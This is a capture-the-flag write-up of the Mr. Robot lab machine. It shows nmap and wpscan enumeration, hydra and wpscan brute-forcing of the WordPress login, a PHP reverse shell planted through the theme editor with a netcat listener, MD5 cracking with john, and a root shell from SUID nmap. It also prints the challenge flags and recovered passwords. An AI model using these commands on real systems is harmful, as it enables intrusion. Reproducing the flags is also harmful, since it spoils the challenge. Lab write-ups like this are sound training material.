# Mr. Robot CTF — Full Writeup

**Author:** Obito Uchiha — Team AKATSUKI **Target:** `10.48.190.143` **Category:** Web Exploitation → Linux Privilege Escalation

---

## 1. Reconnaissance

### 1.1 Port Scan

```
nmap -sV -p- 10.48.190.143
```

|Port|State|Service|
|---|---|---|
|22/tcp|open|ssh|
|80/tcp|open|http|
|443/tcp|open|https|

Attack surface is clearly web-focused — SSH is open but no credentials yet, so port 80/443 is the entry point.

---

## 2. Web Enumeration (Port 80)

### 2.1 Directory Brute Forcing

Directory brute forcing revealed:

- `/robots.txt`
- A running **WordPress** installation

### 2.2 robots.txt Disclosure

```
curl http://10.48.190.143/robots.txt
```

```
User-agent: *
fsocity.dic
key-1-of-3.txt
```

Two interesting disclosures: a custom wordlist (`fsocity.dic`) and the first flag.

**🚩 Flag 1:** `073403c8a58a1f80d943455fb30724b9`

### 2.3 WPScan Enumeration

```
wpscan --url 'http://10.48.190.143:80' -e u
```

Key findings:

- XML-RPC enabled → `http://10.48.190.143/xmlrpc.php`
- WordPress **4.3.1** (outdated, released 2015)
- Active theme: `twentyfifteen`

---

## 3. Gaining Access

### 3.1 Username Enumeration

No rate limiting on `/wp-login.php`, so brute forcing was feasible.

```
hydra -L dictionary.txt -p admin 10.48.190.143 http-post-form \
"/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2F10.48.190.143%2Fwp-admin%2F&testcookie=1:F=Invalid username" -vV
```

Valid username discovered: **`Elliot`**

> Hydra password hits on this form can produce false positives — WPScan's own password-attack module was used instead for a reliable result.

### 3.2 Password Brute Force

```
wpscan --url 'http://10.48.190.143:80' --usernames Elliot --passwords dictionary.txt
```

Valid credentials: `Elliot : ER28-0652`

### 3.3 Admin Panel → RCE via Theme Editor

Logged into `/wp-admin` with the recovered credentials. Since the account has admin privileges and the **Theme Editor** allows direct PHP file edits, the `404.php` template of the active theme (`twentyfifteen`) was replaced with the **pentestmonkey PHP reverse shell** (IP/port adjusted to the attacking host), then saved.

A listener was started, and the shell was triggered by requesting the 404 page:

```
nc -lvnp <PORT>
```

```
GET /wp-content/themes/twentyfifteen/404.php
```

Shell caught:

```
$ id
uid=1(daemon) gid=1(daemon) groups=1(daemon)
```

### 3.4 Shell Stabilization

```
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
export TERM=xterm
```

---

## 4. Privilege Escalation — `daemon` → `robot`

Enumerating the filesystem under `/home/robot` revealed the second flag's directory, which contained an MD5 password hash instead of the flag directly (the flag file was unreadable without `robot`'s permissions).

### 4.1 Cracking the Hash

```
john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
john --show --format=raw-md5 hash.txt
```

Result:

```
robot:abcdefghijklmnopqrstuvwxyz
```

### 4.2 Reading the Flag

```
su robot
$ whoami
robot
$ cat key-2-of-3.txt
```

**🚩 Flag 2:** `822c73956184f694993bede3eb39f959`

---

## 5. Privilege Escalation — `robot` → `root`

`sudo -l` was denied:

```
Sorry, user robot may not run sudo on ip-10-48-190-143.
```

Pivoted to searching for SUID binaries:

```
find / -perm -u=s -type f 2>/dev/null
```

`/usr/local/bin/nmap` stood out with the SUID bit set — a well-known GTFOBins privilege escalation vector for old Nmap versions with interactive mode.

### 5.1 Exploiting SUID Nmap

```
nmap --interactive
```

Inside Nmap's interactive shell:

```
nmap> !sh
```

This spawns a root shell, confirmed with:

```
# id
uid=0(root) ...
```

### 5.2 Final Flag

```
# cat /root/key-3-of-3.txt
```

**🚩 Flag 3:** `04787ddef27c3dee1ee161b21670b4e4`

---

## 6. Summary

|Stage|Technique|
|---|---|
|Recon|Nmap port scan, directory brute force|
|Initial foothold|WordPress credential brute force + Theme Editor RCE|
|Priv-esc 1|Cracked MD5 hash with John the Ripper (rockyou.txt)|
|Priv-esc 2|SUID Nmap interactive-mode escape (GTFOBins)|

**All three keys captured — root achieved.**

---

_Writeup by Obito Uchiha — Team AKATSUKI_
